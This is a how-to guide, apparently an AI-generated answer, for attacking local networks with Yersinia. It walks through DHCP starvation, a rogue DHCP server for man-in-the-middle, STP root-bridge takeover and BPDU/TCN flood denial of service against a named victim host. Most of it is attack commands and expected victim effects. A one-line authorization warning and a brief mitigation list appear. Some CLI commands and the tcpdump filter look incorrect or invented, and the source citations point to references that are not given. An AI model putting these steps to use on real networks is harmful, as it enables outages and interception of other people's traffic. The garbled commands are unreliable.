# Launch **layer‑2 attacks** using Yersinia, with **real-traffic examples** on a victim host. 

❗Only perform these in a controlled lab or with explicit authorization.

---

## 🎯 1. DHCP Starvation + Rogue DHCP (Target: victim-PC)

### A. DHCP Starvation

* **Goal**: deplete DHCP pool.

**Steps**:

1. Start Yersinia in GUI:

   ```bash
   sudo yersinia -G
   ```
2. Navigate: *Launch attack → DHCP → sending DISCOVER packet* → *OK*
3. Monitor victim side (`victim-PC`):

   * It sends DISCOVER but never gets an address.
   * Watch packet flood in Wireshark or `yersinia.log`.
4. Stop when pool is depleted: *List attacks → cancel*.

### B. Rogue DHCP Injection

* **Goal**: assign victim a fake IP/DNS/gateway.

**Steps**:

1. After starvation, deploy rogue DHCP server:

   ```bash
   sudo apt install isc-dhcp-server
   ```
2. Configure `/etc/dhcp/dhcpd.conf`:

   ```
   subnet 192.168.1.0 netmask 255.255.255.0 {
     range 192.168.1.200 192.168.1.220;
     option routers 192.168.1.254;
     option domain-name-servers 1.1.1.1;
   }
   ```
3. Restart service and let victim renew lease.
4. Victim uses attacker’s gateway/DNS → full MITM.

💡 Combine with Bettercap ARP spoofing for traffic interception.

---

## 🌐 2. STP Attacks (Target: switch/victim-network)

### A. Claim Root Bridge

* **Goal**: redirect network via attacker.

**Steps**:

```bash
sudo yersinia stp -I
```

* In curses UI, go to *STP → Launch Attack → Claim root role*
* Attacker floods low-priority BPDUs → switch re-elects attacker as root ([AmIRootYet][1], [ProSec GmbH][2], [ProSec GmbH][3])
* Now **all inter-switch traffic** flows through attacker’s NIC.

### B. STP DoS – BPDU Flood / TCN Flood

* **Goal**: disrupt LAN traffic.

**Steps**:

* In same STP menu:

  * **Conf BPDU DoS** (flood wrong config frames)
  * **TCN DoS** (constant restructuring)
* Output: network congestion or switch reconverges repeatedly ([ProSec GmbH][3]).

📌 Victim symptoms: latency, path flaps, excessive broadcast/multicast.

---

## 🧠 Example CLI Attacks (without GUI)

```bash
# DHCP starvation:
sudo yersinia dhcp -a

# STP root claim:
sudo yersinia stp -r

# STP BPDU flood:
sudo yersinia -D
# Then in CLI:
stp flood
```

Use `yersinia <protocol> -h` to explore options ([Black Hat][4]).

---

## 🔍 Monitoring & Verification

* On **victim**:

  * `ip a` → no DHCP lease or wrong gateway.
  * DNS fails or resolves via fake DNS.
* On **network**:

  * Use `tcpdump -i eth0 ether proto 0x006` to capture BPDU frames.
  * Check switch logs for root-change messages.

---

## 🛡️ Mitigation Strategies

* Enable **DHCP Snooping**, **Port Security**, and limit MACs per port.
* On switches:

  ```text
  switchport mode access
  spanning-tree bpduguard enable
  spanning-tree guard root
  ```

  Prevent DTP, dynamic trunking and rogue STP devices.

---

## 🗂️ Summary Table

| Attack Type     | Command                       | Victim Effect                  |
| --------------- | ----------------------------- | ------------------------------ |
| DHCP Starvation | `yersinia dhcp -a` or GUI     | No DHCP IP → LAN DoS           |
| Rogue DHCP      | rogue server after starvation | MitM via fake gateway/DNS      |
| STP Root Claim  | `yersinia stp -r` or GUI      | Intercept inter-switch traffic |
| STP DoS         | BPDU/TCN flood  via GUI/CLI   | Traffic blips, loops, outages  |

---
